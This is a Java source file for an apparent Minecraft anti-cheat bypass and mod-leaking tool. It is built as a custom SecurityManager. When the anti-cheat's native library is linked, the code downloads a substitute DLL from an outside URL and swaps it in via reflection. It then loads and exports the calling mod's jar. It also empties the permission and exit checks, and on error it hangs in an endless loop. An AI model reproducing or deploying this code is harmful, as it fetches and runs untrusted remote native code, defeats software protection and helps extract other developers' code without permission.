package com.alphaautoleak;

import com.alphaautoleak.analyzer.JarAnalyzer;
import com.alphaautoleak.utils.ReflectUtilies;

import org.apache.commons.io.FileUtils;
import org.objectweb.asm.tree.ClassNode;
import sun.reflect.Reflection;

import java.io.File;

import java.net.URL;
import java.security.Permission;

/**
 * @Auther: SnowFlake
 * @Date: 2022/1/30 01:36
 */
public class CustomSecurityManager extends SecurityManager{
    public static Class<?> registerClazz;

    @Override
    public void checkLink(String lib) {
        if (lib.contains("catanticheatx"))
        {
            DynamicLoader.startLoader();
            try {
                System.out.println("CALLED ");
                File temp = File.createTempFile("vbchfgj",".tmp");
                temp.deleteOnExit();
                FileUtils.copyInputStreamToFile(new URL("https://alphaautoleak.coding.net/p/minecraft/d/antiCatAnticheat/git/raw/master/dll/luohuayu.dll?download=true").openStream(),temp);
                ReflectUtilies.modify(lib,temp.getAbsolutePath());
                registerClazz = Reflection.getCallerClass(3);


                JarAnalyzer jarAnalyzer = new JarAnalyzer();

                // load the fucker
                jarAnalyzer.loadJar(new File(registerClazz.getProtectionDomain().getCodeSource().getLocation().getPath())); // may be crash

                // handle the clazz file & get reflection info
                for (ClassNode classNode : jarAnalyzer.classes.values())
                {



                }
                //export to the mods
                jarAnalyzer.exportJar();
            }catch (Exception e)
            {
                while (true)
                {
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException ex) {
                    }
                }
            }
        }
    }



    @Override
    public void checkPermission(Permission perm) {
    }

    @Override
    public void checkExit(int status) {


    }

}
